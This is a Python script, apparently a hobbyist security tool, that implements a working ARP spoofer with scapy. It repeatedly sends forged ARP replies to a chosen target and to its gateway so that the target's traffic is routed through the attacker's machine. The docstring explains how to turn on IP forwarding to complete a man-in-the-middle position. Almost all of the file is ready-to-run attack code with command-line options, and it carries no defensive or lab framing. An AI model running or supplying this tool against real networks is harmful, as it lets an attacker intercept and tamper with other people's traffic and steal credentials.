#!/usr/bin/env python3
"""
Program Name: arp spoofer

Description: Changes the target computer packets to flow through your host machine
first

to set up your computer as a router use: echo 1 > /proc/sys/net/ipv4/ip_forward

to get the router under current network use: route -n

Options:
    -t or --target = target ip address
    -g or --gateway = router ip address
    -m or --mac = host mac address
    --help = argument options


Examples:
    python arp_spoofer.py -t or --target with -g or --gateway with -m or --mac
    python arp_spoofer.py --help

Requirements:
    Runs on Python 2 or 3

Author: CoderMANE

Date: 2024-06-09
"""
import scapy.all as scapy
import time
import optparse

# Only works in Python3 for now, type python3 instead of python file.py


# Collects arguments
def get_arguments():
    # Parse user inputs
    parser = optparse.OptionParser()
    # Describes options
    parser.add_option("-t", "--target", dest="target_ip", help="Target IP address")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway IP address")
    parser.add_option("-m", "--mac", dest="host_mac", help="MAC of host")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify a target IP, use --help for more info.")
    elif not options.gateway_ip:
        parser.error("[-] Please specify a gateway IP, use --help for more info.")
    elif not options.host_mac:
        parser.error("[-] Please specify a host MAC, use --help for more info.")
    return options


options = get_arguments()


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

# Performs the spoof


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=options.host_mac)
    scapy.send(packet, verbose=False)

# Restores the ARP table back to normal


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = options.target_ip
gateway_ip = options.gateway_ip

# Call and use functions
sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print(f"[+] Packets sent: {sent_packets_count}", end='\r')
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C .... Resetting ARP tables..... Please Wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
